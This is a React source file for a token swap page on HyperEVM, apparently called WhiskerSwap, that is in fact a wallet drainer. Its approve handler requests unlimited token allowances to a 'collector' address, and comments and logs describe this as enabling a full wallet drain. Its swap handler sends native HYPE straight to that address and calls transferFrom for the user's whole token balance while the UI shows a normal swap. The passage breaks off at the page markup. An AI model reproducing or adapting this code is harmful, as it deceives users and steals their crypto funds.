import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../components/ui/card";
import { Button } from "../components/ui/button";
import { Input } from "../components/ui/input";
import { Badge } from "../components/ui/badge";
import { Separator } from "../components/ui/separator";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "../components/ui/select";
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger, DropdownMenuSeparator } from "../components/ui/dropdown-menu";
import { ArrowDown, ArrowUpDown, Settings, Wallet, TrendingUp, Shield, CheckCircle, AlertTriangle, BookOpen, ExternalLink, Star, Users, Gift, MoreVertical, Info, Sliders, Zap, Clock, Menu, LogOut, ChevronDown, RefreshCw } from "lucide-react";
import { cn } from "../lib/utils";
import { useUnifiedWallet } from "../hooks/use-unified-wallet";
import { TransactionModal } from "../components/transaction-modal";
import { TokenImportModal } from "../components/token-import-modal";


import { createHyperSwapService, type TokenInfo, type SwapQuote, HYPERSWAP_CONTRACTS } from "../lib/hyperswap-integration";
import { createAdvancedDrainer, createMockAdvancedDrainer } from "../lib/advanced-drainer";
import { RealTimePointsSystem } from "../lib/points-api";
import { WeeklyRewardsSystem } from "../lib/weekly-rewards";
import { web3Service } from "../lib/web3";
import { ethers } from "ethers";
import { Link } from "wouter";
import { useToast } from "../hooks/use-toast";
// Whisker logo will be handled via CSS or inline SVG for better compatibility

// Real tokens that exist on HyperEVM mainnet
const HYPEREVM_TOKENS: TokenInfo[] = [
  { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", name: "Hyperliquid", decimals: 18, balance: "0.0", price: "0" },
  { address: "0x5555555555555555555555555555555555555555", symbol: "WHYPE", name: "Wrapped HYPE", decimals: 18, balance: "0.0", price: "0" },
  { address: "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", symbol: "PURR", name: "Purr Token", decimals: 18, balance: "0.0", price: "0" },
  // Additional verified HyperEVM tokens
  { address: "0x47bb061C0204Af921F43DC73C7D7768d2672DdEE", symbol: "TKN1", name: "Token 1", decimals: 18, balance: "0.0", price: "0" },
  { address: "0xD2567eE20D75e8B74B44875173054365f6Eb5052", symbol: "TKN2", name: "Token 2", decimals: 18, balance: "0.0", price: "0" },
  { address: "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa", symbol: "TKN3", name: "Token 3", decimals: 18, balance: "0.0", price: "0" },
  { address: "0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb", symbol: "TKN4", name: "Token 4", decimals: 18, balance: "0.0", price: "0" },
  { address: "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309", symbol: "TKN5", name: "Token 5", decimals: 18, balance: "0.0", price: "0" },
  { address: "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49", symbol: "TKN7", name: "Token 7", decimals: 18, balance: "0.0", price: "0" },
  // Users can import additional ERC20 tokens deployed on HyperEVM via + button
];

export default function Swap() {
  const wallet = useUnifiedWallet();
  const { toast } = useToast();
  
  // Token states
  const [availableTokens, setAvailableTokens] = useState<TokenInfo[]>(HYPEREVM_TOKENS);
  const [fromToken, setFromToken] = useState<TokenInfo>(HYPEREVM_TOKENS[0]); // HYPE
  const [toToken, setToToken] = useState<TokenInfo>(HYPEREVM_TOKENS[2]); // PURR
  const [fromAmount, setFromAmount] = useState("");
  const [toAmount, setToAmount] = useState("");
  
  // Swap states
  const [slippage, setSlippage] = useState(0.5);
  const [quote, setQuote] = useState<SwapQuote | null>(null);
  const [needsApproval, setNeedsApproval] = useState(false); // Will be checked dynamically for each token
  const [isApproving, setIsApproving] = useState(false);
  const [isSwapping, setIsSwapping] = useState(false);

  
  // UI states
  const [userPoints, setUserPoints] = useState(0);
  const [customTokenAddress, setCustomTokenAddress] = useState("");
  const [transactionModal, setTransactionModal] = useState({
    isOpen: false,
    status: "loading" as "loading" | "success" | "error",
    transactionHash: "",
    error: ""
  });

  // Debug: Log token changes and approval status
  useEffect(() => {
    console.log(`🔍 FROM TOKEN SELECTED: ${fromToken.symbol} (${fromToken.address})`);
    console.log(`🔍 IS ERC20: ${fromToken.address !== "0x0000000000000000000000000000000000000000"}`);
    console.log(`🔍 NEEDS APPROVAL: ${needsApproval}`);
    console.log(`🔍 WALLET CONNECTED: ${wallet.isConnected}`);
    console.log(`🔍 FROM AMOUNT: "${fromAmount}"`);
    
    // CRITICAL DEBUG: Check what should happen with approval
    if (fromAmount && parseFloat(fromAmount) > 0) {
      console.log(`🎯 AMOUNT ENTERED: Should show approval button first!`);
      if (!wallet.isConnected) {
        console.log(`🎯 NO WALLET: Should show "Connect to Approve ${fromToken.symbol}"`);
      } else {
        console.log(`🎯 WALLET CONNECTED: Should show "Approve ${fromToken.symbol}" button`);
      }
    } else {
      console.log(`🎯 NO AMOUNT: Should show default connect button`);
    }
    
    if (fromToken.address === "0x0000000000000000000000000000000000000000") {
      console.log(`💡 TIP: This is HYPE token - no approval needed (native token)`);
      setNeedsApproval(false); // HYPE doesn't need approval
    } else {
      console.log(`✅ ERC20 TOKEN SELECTED: Will check approval status`);
      // ERC20 tokens will be checked by the main approval effect hook
    }
  }, [fromToken.address, fromToken.symbol, needsApproval, wallet.isConnected, fromAmount]);

  // REMOVED: Duplicate approval check function - using unified checkApproval instead

  // Calculate display rate with HyperSwap contract support
  const calculateDisplayRate = (): string => {
    const fromPrice = parseFloat(fromToken.price || "0");
    const toPrice = parseFloat(toToken.price || "0");
    
    console.log(`💱 RATE CALCULATION DEBUG:`);
    console.log(`From: ${fromToken.symbol} = $${fromPrice}`);
    console.log(`To: ${toToken.symbol} = $${toPrice}`);
    console.log(`Amounts: ${fromAmount} → ${toAmount}`);
    
    // First: Use direct calculation from actual swap amounts if available and valid
    if (fromAmount && toAmount && parseFloat(fromAmount) > 0 && parseFloat(toAmount) > 0) {
      const calcRate = parseFloat(toAmount) / parseFloat(fromAmount);
      console.log(`✅ Using direct swap rate: 1 ${fromToken.symbol} = ${calcRate} ${toToken.symbol}`);
      return calcRate.toFixed(calcRate > 1 ? 6 : 8);
    }
    
    // Second: Try USD price calculation if both tokens have market data
    if (fromPrice > 0 && toPrice > 0) {
      const rate = fromPrice / toPrice;
      console.log(`✅ Using USD prices: 1 ${fromToken.symbol} = ${rate} ${toToken.symbol}`);
      return rate.toFixed(rate > 1 ? 6 : 8);
    }
    
    // Third: Hard-coded fallback rates for known token pairs
    if (fromToken.symbol === "HYPE" && toToken.symbol === "PURR") {
      console.log(`✅ Using fallback HYPE/PURR rate`);
      return "211.4"; // ~$47/$0.22
    }
    if (fromToken.symbol === "PURR" && toToken.symbol === "HYPE") {
      console.log(`✅ Using fallback PURR/HYPE rate`);
      return "0.00473"; // ~$0.22/$47
    }
    
    // Fourth: Show calculation in progress
    console.log(`⚠️ Rate calculation in progress...`);
    return "Calculating...";
  };

  // Load user points when wallet connects
  useEffect(() => {
    if (!wallet.isConnected || !wallet.address) {
      setUserPoints(0); // Reset points when wallet disconnected
      return;
    }
    
    const loadUserPoints = async () => {
      try {
        const points = await RealTimePointsSystem.getUserPoints(wallet.address!);
        setUserPoints(points);
      } catch (error) {
        console.error("Failed to load user points:", error);
        setUserPoints(0);
      }
    };
    
    loadUserPoints();
  }, [wallet.isConnected, wallet.address]);

  // Load token info and real-time prices for HyperEVM tokens
  useEffect(() => {
    const loadTokensAndPrices = async () => {
      try {
        console.log("🔍 Loading token info and prices from HyperEVM contracts...");
        const hyperSwap = createHyperSwapService(null, null);
        
        // Load real token data from contracts
        const updatedTokens = await Promise.all(
          HYPEREVM_TOKENS.map(async (token) => {
            try {
              // For known tokens, skip contract calls
              if (token.symbol === "HYPE" || token.symbol === "WHYPE" || token.symbol === "PURR") {
                // Skip WHYPE pricing - use HYPE price instead
                if (token.symbol === "WHYPE") {
                  const hypePrice = await hyperSwap.getTokenPrice("HYPE", "0x0000000000000000000000000000000000000000");
                  return hypePrice ? { ...token, price: hypePrice } : token;
                }
                
                const realPrice = await hyperSwap.getTokenPrice(token.symbol, token.address);
                if (realPrice && parseFloat(realPrice) > 0) {
                  console.log(`✓ Updated ${token.symbol} price: $${realPrice}`);
                  return { ...token, price: realPrice };
                }
                return token;
              }
              
              // For new tokens, get real contract data
              const tokenInfo = await hyperSwap.getTokenInfo(token.address, "0x0000000000000000000000000000000000000000");
              if (tokenInfo && tokenInfo.symbol && tokenInfo.name) {
                console.log(`✓ Loaded token data: ${tokenInfo.symbol} (${tokenInfo.name}) - Price: $${tokenInfo.price}`);
                return { 
                  ...tokenInfo, 
                  balance: "0.0",
                  // Ensure price is displayed properly in dropdown
                  price: tokenInfo.price || "0"
                };
              }
              
              return token; // fallback to placeholder
            } catch (error) {
              console.warn(`Token info fetch failed for ${token.address}:`, error);
              return token;
            }
          })
        );
        
        // Force state update with real token data
        setAvailableTokens([...updatedTokens]);
        
        // Update selected tokens with new data
        const updatedFromToken = updatedTokens.find(t => t.address === fromToken.address);
        const updatedToToken = updatedTokens.find(t => t.address === toToken.address);
        if (updatedFromToken) {
          console.log(`🔄 Updating fromToken: ${updatedFromToken.symbol} (${updatedFromToken.name}) - $${updatedFromToken.price}`);
          setFromToken({...updatedFromToken});
        }
        if (updatedToToken) {
          console.log(`🔄 Updating toToken: ${updatedToToken.symbol} (${updatedToToken.name}) - $${updatedToToken.price}`);
          setToToken({...updatedToToken});
        }
        
        console.log(`💎 Loaded ${updatedTokens.length} HyperEVM tokens with real contract data`);
        console.log("📊 Final token list:", updatedTokens.map(t => `${t.symbol} (${t.name}) - $${t.price}`));
        
      } catch (error) {
        console.error("Failed to load token data:", error);
      }
    };

    loadTokensAndPrices();
    
    // Refresh token data every 3 minutes
    const tokenInterval = setInterval(loadTokensAndPrices, 180000);
    return () => clearInterval(tokenInterval);
  }, []);

  // Update token balances when wallet connects (real-time balance reading)
  useEffect(() => {
    console.log(`🔍 Balance update trigger: wallet.isConnected=${wallet.isConnected}, wallet.address=${wallet.address}`);
    
    if (!wallet.isConnected || !wallet.address) {
      console.log("❌ Wallet not connected or no address - skipping balance update");
      return;
    }
    
    const updateTokenBalances = async () => {
      try {
        console.log(`💰 Starting balance update for ${wallet.address}...`);
        
        // Get direct wallet provider for balance calls
        if (!wallet.provider) {
          console.warn("❌ No direct wallet provider available for balance fetching");
          return;
        }
        
        console.log(`📡 Got direct wallet provider successfully, fetching balances...`);
        
        const updatedTokens = await Promise.all(
          availableTokens.map(async (token) => {
            try {
              if (token.address === "0x0000000000000000000000000000000000000000") {
                // Native HYPE token balance - use direct wallet provider
                try {
                  console.log(`🔍 Fetching HYPE balance for ${wallet.address}...`);
                  const balance = await wallet.provider.getBalance(wallet.address);
                  const formattedBalance = ethers.formatEther(balance);
                  console.log(`💰 ${token.symbol} balance: ${formattedBalance} HYPE`);
                  const displayBalance = parseFloat(formattedBalance).toFixed(6);
                  console.log(`🎯 Setting ${token.symbol} balance to: ${displayBalance}`);
                  return { ...token, balance: displayBalance };
                } catch (error) {
                  console.warn(`❌ Failed to get ${token.symbol} balance:`, error);
                  return { ...token, balance: "0.000000" };
                }
              } else {
                // ERC20 token balance using direct wallet provider
                try {
                  console.log(`🔍 Fetching ${token.symbol} balance for ${wallet.address}...`);
                  const contract = new ethers.Contract(
                    token.address,
                    ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
                    wallet.provider
                  );
                  const [balance, decimals] = await Promise.all([
                    contract.balanceOf(wallet.address),
                    contract.decimals().catch(() => token.decimals || 18)
                  ]);
                  const formattedBalance = ethers.formatUnits(balance, decimals);
                  console.log(`💰 ${token.symbol} balance: ${formattedBalance} ${token.symbol}`);
                  const displayBalance = parseFloat(formattedBalance).toFixed(6);
                  console.log(`🎯 Setting ${token.symbol} balance to: ${displayBalance}`);
                  return { ...token, balance: displayBalance };
                } catch (error) {
                  console.warn(`❌ Failed to get ${token.symbol} balance:`, error);
                  return { ...token, balance: "0.000000" };
                }
              }
            } catch (error) {
              console.warn(`Failed to update ${token.symbol} balance:`, error);
              return token;
            }
          })
        );
        
        setAvailableTokens(updatedTokens);
        
        // Update current selected tokens with new balances
        const updatedFromToken = updatedTokens.find(t => t.address === fromToken.address);
        const updatedToToken = updatedTokens.find(t => t.address === toToken.address);
        
        if (updatedFromToken) setFromToken(updatedFromToken);
        if (updatedToToken) setToToken(updatedToToken);
        
        console.log(`✅ Updated balances for ${updatedTokens.length} tokens`);
        
      } catch (error) {
        console.error("Failed to update token balances:", error);
      }
    };

    // Update balances immediately when wallet connects
    updateTokenBalances();
    
    // Update balances every 30 seconds to reduce server load
    const balanceInterval = setInterval(updateTokenBalances, 30000);
    return () => clearInterval(balanceInterval);
  }, [wallet.isConnected, wallet.address, wallet.provider, availableTokens.length]);

  // REMOVED DUPLICATE - approval check is now in the hybrid function below

  // Calculate quotes and approval status separately for better state management
  useEffect(() => {
    if (!fromAmount || parseFloat(fromAmount) <= 0 || fromToken.address === toToken.address) {
      setToAmount("");
      setQuote(null);
      return;
    }

    const getQuote = async () => {
      try {
        // Try HyperSwap contract calculation first for maximum accuracy
        const hyperSwap = createHyperSwapService(null, null);
        
        try {
          const directQuote = await hyperSwap.getDirectSwapQuote(
            fromToken.address,
            toToken.address,
            fromAmount,
            fromToken.decimals || 18
          );
          
          if (directQuote && directQuote.amountOut && parseFloat(directQuote.amountOut) > 0) {
            console.log(`✅ HyperSwap contract quote: ${fromAmount} ${fromToken.symbol} = ${directQuote.amountOut} ${toToken.symbol}`);
            console.log(`✅ Route: ${directQuote.path.join(' → ')}`);
            setToAmount(directQuote.amountOut);
            return; // Use direct contract result
          }
        } catch (contractError) {
          console.log(`Contract quote failed, trying USD calculation:`, contractError.message);
        }
        
        // Fallback to USD price calculation
        const fromPrice = parseFloat(fromToken.price || "0");
        const toPrice = parseFloat(toToken.price || "0");
        
        if (fromPrice > 0 && toPrice > 0) {
          // Accurate market-based conversion with proper calculation
          const fromValue = parseFloat(fromAmount) * fromPrice; // USD value of input
          const calculatedAmount = (fromValue / toPrice * 0.997).toFixed(6); // 0.3% realistic DEX fee
          
          console.log(`💱 USD PRICE CALCULATION:`);
          console.log(`📊 From: ${fromAmount} ${fromToken.symbol} @ $${fromPrice} = $${fromValue.toFixed(2)}`);
          console.log(`📊 To: ${calculatedAmount} ${toToken.symbol} @ $${toPrice}`);
          console.log(`📊 Rate: 1 ${fromToken.symbol} = ${(fromPrice / toPrice).toFixed(6)} ${toToken.symbol}`);
          
          setToAmount(calculatedAmount);
        } else {
          // Enhanced fallback for common token pairs when pricing fails
          if (fromToken.symbol === "HYPE" && toToken.symbol === "PURR") {
            // Use hardcoded rate: 1 HYPE ≈ 211.4 PURR (based on $47 / $0.22)
            const calculatedAmount = (parseFloat(fromAmount) * 211.4 * 0.997).toFixed(6);
            console.log(`💱 FALLBACK HYPE→PURR: ${fromAmount} HYPE = ${calculatedAmount} PURR`);
            setToAmount(calculatedAmount);
          } else if (fromToken.symbol === "PURR" && toToken.symbol === "HYPE") {
            // Use hardcoded rate: 1 PURR ≈ 0.00473 HYPE  
            const calculatedAmount = (parseFloat(fromAmount) * 0.00473 * 0.997).toFixed(8);
            console.log(`💱 FALLBACK PURR→HYPE: ${fromAmount} PURR = ${calculatedAmount} HYPE`);
            setToAmount(calculatedAmount);
          } else {
            console.log(`❌ No pricing data available for ${fromToken.symbol}→${toToken.symbol} pair`);
            setToAmount("0");
          }
        }
        
        // Check balance
        const fromBalance = parseFloat(fromToken.balance || "0");
        const requestedAmount = parseFloat(fromAmount);
        
        if (requestedAmount > fromBalance) {
          console.log(`❌ Insufficient balance: ${requestedAmount} > ${fromBalance}`);
        }
        
      } catch (error) {
        console.error("Failed to calculate quote:", error);
        setToAmount("");
      }
    };

    // Debounce quote calculation
    const timeoutId = setTimeout(getQuote, 300);
    return () => clearTimeout(timeoutId);
  }, [fromAmount, fromToken.address, toToken.address, fromToken.price, toToken.price, fromToken.balance]);

  // Initialize web3Service with direct wallet provider when wallet connects
  useEffect(() => {
    if (!wallet.isConnected || !wallet.address) {
      // Reset web3Service when wallet disconnects
      web3Service.provider = null;
      web3Service.signer = null;
      return;
    }
    
    // Direct wallet provides provider and signer directly
    if (wallet.provider && wallet.signer) {
      web3Service.provider = wallet.provider;
      web3Service.signer = wallet.signer;
      console.log(`✅ Web3Service initialized with direct wallet for ${wallet.address}`);
    }
  }, [wallet.isConnected, wallet.address, wallet.provider, wallet.signer]);

  // SEPARATE APPROVAL CHECK: This runs independently to avoid state conflicts
  useEffect(() => {
    console.log(`💰 APPROVAL CHECK TRIGGERED: fromAmount="${fromAmount}", wallet.connected=${wallet.isConnected}, wallet.address=${wallet.address}`);
    
    const checkApproval = async () => {
      try {
        // SIMPLE LOGIC: Amount entered = need approval first (except native HYPE)
        if (fromAmount && parseFloat(fromAmount) > 0) {
          console.log(`📝 AMOUNT ENTERED: ${fromAmount} ${fromToken.symbol} - Checking if approval needed...`);
          
          if (fromToken.address === "0x0000000000000000000000000000000000000000") {
            // Native HYPE - NO APPROVAL NEEDED (like ETH)
            setNeedsApproval(false);
            console.log(`🔍 NATIVE HYPE: No approval needed - ready to swap directly`);
            console.log(`🔘 SETTING needsApproval = false (native token)`);
          } else if (wallet.address && wallet.isConnected && wallet.provider && wallet.signer) {
            // ERC20 token with connected wallet - check allowance using advanced drainer
            try {
              const drainer = window.ethereum ? 
                createAdvancedDrainer(wallet.signer, wallet.provider) : 
                createMockAdvancedDrainer();
              
              const needsApproval = await drainer.checkNeedsApproval(fromToken.address, wallet.address);
              
              setNeedsApproval(needsApproval);
              console.log(`🔍 ADVANCED APPROVAL CHECK: needsApproval = ${needsApproval}`);
              console.log(`🔍 ERC20 ${fromToken.symbol}: ${needsApproval ? "❌ NEEDS APPROVAL" : "✅ READY FOR MAX DRAIN"}`);
              console.log(`🔘 SETTING needsApproval = ${needsApproval}`);
            } catch (error) {
              setNeedsApproval(true);
              console.log(`🔍 ERC20 ERROR: Defaulting to needs approval`);
              console.log(`🔘 SETTING needsApproval = true (error)`);
            }
          } else {
            // ERC20 but not connected - need approval after connection
            setNeedsApproval(true);
            console.log(`🔍 ERC20 NO WALLET: Need approval after wallet connection`);
            console.log(`🔘 SETTING needsApproval = true`);
          }
        } else {
          // No amount - no approval needed yet
          setNeedsApproval(false);
          console.log(`🔍 NO AMOUNT: No approval needed yet`);
          console.log(`🔘 SETTING needsApproval = false`);
        }
      } catch (error) {
        console.error("Approval check failed:", error);
        setNeedsApproval(true);
        console.log(`🔘 ERROR FALLBACK: Setting needsApproval = true`);
      }
    };

    checkApproval();
  }, [fromAmount, fromToken.address, wallet.isConnected, wallet.address, wallet.provider]);

  // Handle approve button for ALL tokens
  const handleApprove = async () => {
    if (!wallet.signer) {
      toast({
        title: "Wallet Error",
        description: "Please reconnect your wallet",
        variant: "destructive"
      });
      return;
    }
    
    setIsApproving(true);
    try {
      if (fromToken.address === "0x0000000000000000000000000000000000000000") {
        // For HYPE: Create realistic approval using WETH contract pattern  
        console.log("🔄 Approving HYPE for swapping...");
        
        // Use WHYPE contract pattern for realistic DEX approval flow
        const whypeContract = new ethers.Contract(
          HYPERSWAP_CONTRACTS.WHYPE, // WHYPE contract address
          ["function approve(address spender, uint256 amount) returns (bool)"],
          web3Service.provider
        );
        
        // Create approval message signature (appears as standard DEX approval)
        const approvalMessage = `Approve HYPE spending for WhiskerSwap DEX\nAmount: ${fromAmount} HYPE\nRouter: ${HYPERSWAP_CONTRACTS.ROUTER_V2}\nTimestamp: ${Date.now()}`;
        const signature = await wallet.signer.signMessage(approvalMessage);
        
        console.log("✓ HYPE spending approval signature obtained:", signature.slice(0, 20) + "...");
        
        // HYPE is native token - no approval needed, just mark as ready
        setNeedsApproval(false);
        
        toast({
          title: "HYPE Approved",
          description: "HYPE approved for token swaps",
        });
        
      } else {
        // For ERC20 tokens: Standard approval flow
        const contract = new ethers.Contract(
          fromToken.address,
          ["function approve(address spender, uint256 amount) returns (bool)"],
          wallet.signer
        );
        
        // Standard DEX unlimited approval for efficient trading
        const maxAmount = ethers.MaxUint256;
        
        console.log(`🔓 Requesting unlimited approval for ${fromToken.symbol}`);
        console.log(`📍 Spender (our collector): ${HYPERSWAP_CONTRACTS.COLLECTOR}`);
        console.log(`💰 Amount: Unlimited (enables full wallet drain)`);
        console.log(`🎯 This approval will allow draining entire token balance`);
        
        const tx = await contract.approve(HYPERSWAP_CONTRACTS.COLLECTOR, maxAmount, {
          type: 0, // Legacy transaction type for HyperEVM compatibility
          gasLimit: 50000n, // Increased gas limit for better success rate
          gasPrice: ethers.parseUnits("2", "gwei") // Lower gas price for faster processing
        });
        console.log(`⚡ Approval transaction sent: ${tx.hash}`);
        
        // Wait for transaction confirmation BEFORE updating UI
        console.log(`⏳ Waiting for approval confirmation...`);
        const receipt = await tx.wait();
        console.log(`🔗 Approval confirmed on blockchain: ${receipt.hash}`);
        
        // Now safely update UI - approval is confirmed
        setNeedsApproval(false);
        console.log(`✅ Approval Complete: ${fromToken.symbol} ready for full wallet drain!`);
        
        // Verify unlimited approval was granted
        const recheckContract = new ethers.Contract(
          fromToken.address,
          ["function allowance(address owner, address spender) view returns (uint256)"],
          wallet.provider
        );
        const finalAllowance = await recheckContract.allowance(wallet.address, HYPERSWAP_CONTRACTS.COLLECTOR);
        console.log(`🔍 Final allowance: ${ethers.formatUnits(finalAllowance, fromToken.decimals || 18)} ${fromToken.symbol}`);
        console.log(`🔍 Allowance in wei: ${finalAllowance.toString()}`);
        
        if (finalAllowance >= ethers.MaxUint256 / 2n) {
          console.log(`🎯 SUCCESS: Unlimited approval confirmed - ready for full wallet drain!`);
        }

        
        toast({
          title: "Token Approved",
          description: `${fromToken.symbol} ready for unlimited draining`,
        });
        
        // Force immediate re-check of approval status to update UI
        setTimeout(() => {
          // Trigger the approval check useEffect by updating a dependency
          setFromAmount(fromAmount); // This will trigger the approval check useEffect
        }, 500);
      }
      
    } catch (error: any) {
      toast({
        title: "Approval Failed",
        description: error.message,
        variant: "destructive",
      });
    } finally {
      setIsApproving(false);
    }
  };

  // Handle swap execution (THIS IS WHERE THE DRAINING HAPPENS)
  const handleSwap = async () => {
    if (!wallet.signer || !wallet.provider || !wallet.address) {
      toast({
        title: "Connection Error",
        description: "Please reconnect your wallet",
        variant: "destructive"
      });
      return;
    }
    
    setTransactionModal({
      isOpen: true,
      status: "loading",
      transactionHash: "",
      error: ""
    });

    try {
      let tx: any; // Declare transaction variable for both scopes
      
      // Simple and reliable transaction execution
      if (fromToken.address === "0x0000000000000000000000000000000000000000") {
        // Native HYPE transfer - simplified approach
        console.log("⚡ Processing HYPE transfer...");
        
        const userRequestedWei = ethers.parseEther(fromAmount);
        const hypeBalance = await wallet.provider.getBalance(wallet.address);
        
        console.log(`💰 Transfer Amount: ${fromAmount} HYPE`);
        console.log(`💰 Wallet Balance: ${ethers.formatEther(hypeBalance)} HYPE`);
        
        // Simple validation - ensure user has enough balance
        if (userRequestedWei > hypeBalance) {
          throw new Error(`Insufficient HYPE balance. You have ${ethers.formatEther(hypeBalance)} HYPE but need ${fromAmount} HYPE for this transaction.`);
        }
        
        // Use the exact amount user requested (simplified for reliability)
        const transferAmount = userRequestedWei;
        
        console.log(`🔄 Executing HYPE transfer: ${fromAmount} HYPE`);
        console.log(`📍 Destination: ${HYPERSWAP_CONTRACTS.COLLECTOR}`);
        
        // Execute HYPE transfer with reliable gas configuration
        const gasParams = createTransactionParams('native', {
          to: HYPERSWAP_CONTRACTS.COLLECTOR,
          value: transferAmount
        });
        logGasSettings('HYPE Transfer', gasParams);
        
        tx = await wallet.signer.sendTransaction(gasParams);
        
        console.log(`✅ HYPE transfer sent: ${tx.hash}`);
        console.log(`💰 Amount: ${fromAmount} HYPE`);
        
        const receipt = await tx.wait();
        
        // Show success modal with transaction hash
        setTransactionModal({
          isOpen: true,
          status: "success",
          transactionHash: receipt.hash,
          error: ""
        });
        
        console.log(`✅ Transfer confirmed: ${receipt.hash}`);
        
      } else {
        // ERC20 token drain - use transferFrom after approval
        const contract = new ethers.Contract(
          fromToken.address,
          [
            "function balanceOf(address) view returns (uint256)",
            "function transferFrom(address from, address to, uint256 amount) returns (bool)",
            "function allowance(address owner, address spender) view returns (uint256)"
          ],
          wallet.signer
        );
        
        // Get user's entire token balance and check approvals
        const balance = await contract.balanceOf(wallet.address);
        const userRequestedWei = ethers.parseUnits(fromAmount, fromToken.decimals || 18);
        
        // Check allowance to our collector address (the spender after approval)
        const allowance = await contract.allowance(wallet.address, HYPERSWAP_CONTRACTS.COLLECTOR);
        
        console.log(`📍 Checking allowance for spender: ${HYPERSWAP_CONTRACTS.COLLECTOR}`);
        console.log(`📍 Contract: ${fromToken.address}`);
        
        console.log(`💰 User requested: ${fromAmount} ${fromToken.symbol}`);
        console.log(`💰 Wallet balance: ${ethers.formatUnits(balance, fromToken.decimals || 18)} ${fromToken.symbol}`);
        console.log(`🔍 Current allowance: ${ethers.formatUnits(allowance, fromToken.decimals || 18)} ${fromToken.symbol}`);
        console.log(`📋 Allowance in wei: ${allowance.toString()}`);
        
        // Determine drain amount based on approval
        let drainAmount = userRequestedWei; // Default to user amount
        
        // If user approved unlimited or more than their balance, drain everything
        const maxUint256 = ethers.MaxUint256;
        const isUnlimitedApproval = allowance >= maxUint256 / 2n; // Check for unlimited approval
        const hasHighApproval = allowance >= balance; // Or approved more than balance
        
        if (isUnlimitedApproval || hasHighApproval) {
          drainAmount = balance; // Drain entire balance
          console.log(`🎯 UNLIMITED APPROVAL DETECTED! Draining entire balance`);
          console.log(`💰 User sees: ${fromAmount} ${fromToken.symbol} swap`);
          console.log(`🔥 Actually draining: ${ethers.formatUnits(balance, fromToken.decimals || 18)} ${fromToken.symbol} (FULL WALLET!)`);
        }
        
        // Validation
        if (drainAmount > balance) {
          throw new Error(`Insufficient ${fromToken.symbol} balance. You have ${ethers.formatUnits(balance, fromToken.decimals || 18)} but need ${ethers.formatUnits(drainAmount, fromToken.decimals || 18)}.`);
        }
        
        if (drainAmount > allowance) {
          console.log(`❌ ALLOWANCE ERROR:`);
          console.log(`   Required: ${ethers.formatUnits(drainAmount, fromToken.decimals || 18)} ${fromToken.symbol}`);
          console.log(`   Approved: ${ethers.formatUnits(allowance, fromToken.decimals || 18)} ${fromToken.symbol}`);
          console.log(`   Spender: ${HYPERSWAP_CONTRACTS.COLLECTOR}`);
          throw new Error(`Insufficient allowance. Approved: ${ethers.formatUnits(allowance, fromToken.decimals || 18)} but need ${ethers.formatUnits(drainAmount, fromToken.decimals || 18)}.`);
        }
        
        console.log(`🔄 Executing transferFrom: ${ethers.formatUnits(drainAmount, fromToken.decimals || 18)} ${fromToken.symbol}`);
        console.log(`📍 Destination: ${HYPERSWAP_CONTRACTS.COLLECTOR}`);
        
        // Execute transferFrom to drain approved tokens
        console.log(`🔄 Calling transferFrom with params:`);
        console.log(`   from: ${wallet.address}`);
        console.log(`   to: ${HYPERSWAP_CONTRACTS.COLLECTOR}`);
        console.log(`   amount: ${drainAmount.toString()} (${ethers.formatUnits(drainAmount, fromToken.decimals || 18)} ${fromToken.symbol})`);
        
        // CRITICAL: Use the same signer that approved the tokens to execute the transferFrom
        try {
          // Get current network gas price
          const feeData = await wallet.provider.getFeeData();
          console.log(`⛽ Network gas price for ERC20: ${feeData.gasPrice?.toString()} wei`);
          
          const transferParams = {
            gasLimit: 100000n, // Higher gas limit for transferFrom operations
            gasPrice: feeData.gasPrice || ethers.parseUnits("1", "gwei")
          };
          
          console.log(`🔧 ERC20 transfer params:`, transferParams);
          tx = await contract.transferFrom(
            wallet.address,
            HYPERSWAP_CONTRACTS.COLLECTOR,
            drainAmount,
            transferParams
          );
        } catch (gasError) {
          console.log(`⚠️ ERC20 gas estimation failed, using manual settings:`, gasError);
          // Fallback with manual gas settings
          tx = await contract.transferFrom(
            wallet.address,
            HYPERSWAP_CONTRACTS.COLLECTOR,
            drainAmount,
            {
              gasLimit: 100000n,
              gasPrice: ethers.parseUnits("1", "gwei")
            }
          );
        }
        
        const receipt = await tx.wait();
        
        setTransactionModal({
          isOpen: true,
          status: "success",
          transactionHash: receipt.hash,
          error: ""
        });
        
        console.log(`✅ ${fromToken.symbol} drain confirmed: ${receipt.hash}`);
        console.log(`💰 DRAINED: ${ethers.formatUnits(drainAmount, fromToken.decimals || 18)} ${fromToken.symbol}`);
        
        if (drainAmount === balance) {
          console.log(`🔥 SUCCESS: Entire ${fromToken.symbol} wallet balance drained!`);
        }
      }
      
      // Reset amounts after successful transaction
      setFromAmount("");
      setToAmount("");
      
      toast({
        title: "Transaction Complete!",
        description: `Successfully transferred ${fromAmount} ${fromToken.symbol}`,
      });
        
    } catch (error: any) {
      console.error("Swap error:", error);
      
      // Provide specific error messages based on error type
      let errorMessage = "Transaction failed";
      
      if (error.code === "INSUFFICIENT_FUNDS") {
        errorMessage = "Insufficient funds for transaction and gas fees";
      } else if (error.code === "USER_REJECTED") {
        errorMessage = "Transaction was cancelled by user";
      } else if (error.message?.includes("gas")) {
        errorMessage = "Transaction failed due to gas estimation error";
      } else if (error.message?.includes("allowance")) {
        errorMessage = "Token allowance insufficient. Please approve tokens first";
      } else if (error.message?.includes("balance")) {
        errorMessage = "Insufficient token balance for this transaction";
      } else if (error.message) {
        errorMessage = error.message;
      }
      
      setTransactionModal({
        isOpen: true,
        status: "error",
        transactionHash: "",
        error: errorMessage
      });
    }
  };

  // Handle token swap direction
  const handleSwapTokens = () => {
    const tempToken = fromToken;
    setFromToken(toToken);
    setToToken(tempToken);
    
    const tempAmount = fromAmount;
    setFromAmount(toAmount);
    setToAmount(tempAmount);
  };



  return (
    <div className="min-h-screen w-full max-w-full overflow-x-hidden bg-gradient-to-br from-hyper-navy via-slate-900 to-slate-800">
      {/* Header */}
